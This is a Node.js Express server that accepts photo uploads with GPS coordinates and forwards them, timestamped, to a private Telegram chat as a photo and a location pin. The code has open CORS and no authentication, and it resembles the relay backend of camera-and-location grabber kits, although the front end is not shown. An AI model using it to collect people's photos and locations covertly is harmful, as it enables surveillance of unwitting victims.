// server.js (CommonJS) - sends photo with timestamp caption, then sends a location pin
require('dotenv').config();
const express = require('express');
const multer = require('multer');
const fs = require('fs');
const fetch = require('node-fetch'); // v2 works with require
const FormData = require('form-data');

const app = express();
const upload = multer({ dest: 'uploads/' });

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
  console.error('ERROR: TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID must be set in environment.');
  process.exit(1);
}

app.use(express.json());
app.use((req, res, next) => {
  // Allow cross-origin requests from Netlify / local dev
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

// helper: format timestamp (local time)
function formatTimestamp(date = new Date()) {
  // e.g. 2025-11-09 20:01:23 IST  (we keep timezone name short if available)
  const pad = (n) => String(n).padStart(2, '0');
  const year = date.getFullYear();
  const month = pad(date.getMonth() + 1);
  const day = pad(date.getDate());
  const hrs = pad(date.getHours());
  const mins = pad(date.getMinutes());
  const secs = pad(date.getSeconds());
  // timezone offset in hours
  const tzOffsetMin = -date.getTimezoneOffset();
  const tzHours = Math.floor(Math.abs(tzOffsetMin) / 60);
  const tzMins = Math.abs(tzOffsetMin) % 60;
  const sign = tzOffsetMin >= 0 ? '+' : '-';
  const tz = `UTC${sign}${String(tzHours).padStart(2,'0')}:${String(tzMins).padStart(2,'0')}`;
  return `${year}-${month}-${day} ${hrs}:${mins}:${secs} ${tz}`;
}

app.post('/upload', upload.single('file'), async (req, res) => {
  try {
    const filePath = req.file && req.file.path;
    const { latitude, longitude } = req.body || {};

    console.log('Received upload:', { latitude, longitude, filePath });

    // Build a caption with timestamp
    const ts = formatTimestamp(new Date());
    const captionParts = [`📸 New photo captured — ${ts}`];
    if (latitude && longitude) {
      captionParts.push(`📍 ${latitude}, ${longitude}`);
    }
    const caption = captionParts.join('\n');

    // 1) Send the photo with caption
    if (filePath) {
      const form = new FormData();
      form.append('chat_id', TELEGRAM_CHAT_ID);
      form.append('photo', fs.createReadStream(filePath));
      form.append('caption', caption);

      const photoResp = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: form,
      });
      const photoJson = await photoResp.json().catch(() => null);
      console.log('sendPhoto response:', photoJson);
    } else {
      console.warn('No file provided in upload.');
    }

    // 2) If coordinates exist, send a clickable location pin
    if (latitude && longitude) {
      const lat = parseFloat(latitude);
      const lon = parseFloat(longitude);
      if (!isNaN(lat) && !isNaN(lon)) {
        const locResp = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            latitude: lat,
            longitude: lon
          }),
        });
        const locJson = await locResp.json().catch(() => null);
        console.log('sendLocation response:', locJson);
      } else {
        console.warn('Latitude/longitude could not be parsed to numbers:', latitude, longitude);
      }
    } else {
      console.log('No coordinates provided; skipping sendLocation.');
    }

    // Remove temp file
    if (filePath) {
      fs.unlink(filePath, (err) => {
        if (err) console.warn('Failed to delete temp file:', err);
      });
    }

    res.json({ success: true, message: 'Photo and (optional) location sent to Telegram.' });
  } catch (err) {
    console.error('Upload handler error:', err);
    res.status(500).json({ error: 'Upload/send failed', details: err.message || String(err) });
  }
});

app.get('/', (req, res) => {
  res.send('📷 Nexus Media backend running...');
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
